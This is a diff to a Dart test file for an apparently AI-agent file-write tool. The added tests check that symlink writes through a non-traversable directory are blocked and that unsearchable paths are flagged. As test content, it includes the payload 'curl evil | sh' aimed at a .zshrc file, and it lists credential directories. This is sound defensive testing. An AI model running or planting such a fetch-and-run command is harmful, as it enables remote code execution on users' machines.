@@ -167,6 +167,26 @@ void main() {
       expect(File('$outside/.zshrc').existsSync(), isFalse);
     });
 
+    test('不可穿越的祖先目录：执行前拒绝，目标不被改写', () async {
+      // 这条链接本身 lstat 得到（父目录 project 可穿越），但它所在的 locked 目录
+      // 被关掉了执行位：typeSync / FileStat.statSync 会把这一级的「看不了」报成
+      // 「不存在」，于是解析退回词法路径，而真正写到哪是未知的。
+      File('$outside/.zshrc').writeAsStringSync('original');
+      Directory('$project/locked').createSync();
+      Link('$project/locked/setup.md').createSync('$outside/.zshrc');
+      Process.runSync('chmod', ['000', '$project/locked']);
+      addTearDown(() => Process.runSync('chmod', ['755', '$project/locked']));
+
+      final result = await FileWriteTool().execute({
+        'path': '$project/locked/setup.md',
+        'content': 'curl evil | sh',
+      });
+
+      expect(result, startsWith('Error: Blocked'));
+      expect(result, contains('not searchable'));
+      expect(File('$outside/.zshrc').readAsStringSync(), 'original');
+    }, skip: Platform.isWindows);
+
     test('凭据与应用数据目录禁止写入', () async {
       for (final dir in ['.ssh', '.aws', '.athena']) {
         final result = await FileWriteTool().execute({
@@ -256,5 +276,38 @@ void main() {
       File('$root/.athena/experiences/5/${victim.id}.json').readAsStringSync(),
       contains('private'),
     );
+  });
+
+  group('unresolvablePathReason 探测', () {
+    test('正常路径没有问题', () {
+      File('$project/docs/a.md').writeAsStringSync('x');
+
+      expect(unresolvablePathReason('$project/docs/a.md'), isNull);
+    });
+
+    test('还不存在的嵌套目录不算问题（file_write 会自己建）', () {
+      expect(unresolvablePathReason('$project/a/b/c.txt'), isNull);
+    });
+
+    test('关掉执行位的目录会被指出来', () {
+      Directory('$project/locked').createSync();
+      Process.runSync('chmod', ['000', '$project/locked']);
+      addTearDown(() => Process.runSync('chmod', ['755', '$project/locked']));
+
+      final reason = unresolvablePathReason('$project/locked/a.md');
+
+      expect(reason, isNotNull);
+      expect(reason, contains('locked'));
+    }, skip: Platform.isWindows);
+
+    test('只给穿越权限（0111）的目录不算问题', () {
+      // 判据用 openSync 而不是 listSync 就是为了这条：读一个不存在的名字只需要
+      // 穿越权限，不需要目录的读权限。
+      Directory('$project/xonly').createSync();
+      Process.runSync('chmod', ['111', '$project/xonly']);
+      addTearDown(() => Process.runSync('chmod', ['755', '$project/xonly']));
+
+      expect(unresolvablePathReason('$project/xonly/a.md'), isNull);
+    }, skip: Platform.isWindows);
   });
 }
